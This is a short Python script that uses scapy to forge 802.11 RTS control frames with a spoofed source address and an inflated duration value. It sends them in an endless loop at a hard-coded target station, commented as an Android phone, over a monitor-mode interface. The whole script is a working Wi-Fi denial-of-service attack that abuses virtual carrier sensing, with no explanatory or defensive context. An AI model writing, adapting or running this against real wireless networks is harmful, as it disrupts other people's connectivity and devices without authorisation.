#!/usr/bin/python

from scapy.all import Dot11, RadioTap, sendp, hexdump
import struct

INTERFACE = 'wlan0mon'
CONTROL = 1
RTS_SUBTYPE = 11
CTS_SUBTYPE = 12

TARGET_STATION = 'f0:25:b7:ea:3c:2e' # Android phone
SRC_ADDR = '22:22:22:22:22:22'

def forgedRTS():
    millis = 615
    blob = struct.pack( "<H", millis )
    millis = struct.unpack( ">H", blob )[0]

    dot11 = Dot11(
			addr1 = TARGET_STATION,
			addr2 = SRC_ADDR,
        	type = CONTROL,
			subtype = RTS_SUBTYPE,
			ID = millis )

    return  RadioTap() / dot11


frame = forgedRTS()

frame.show()
hexdump( frame )

sendp( frame, iface = INTERFACE, inter = 0.1, loop = 1 )
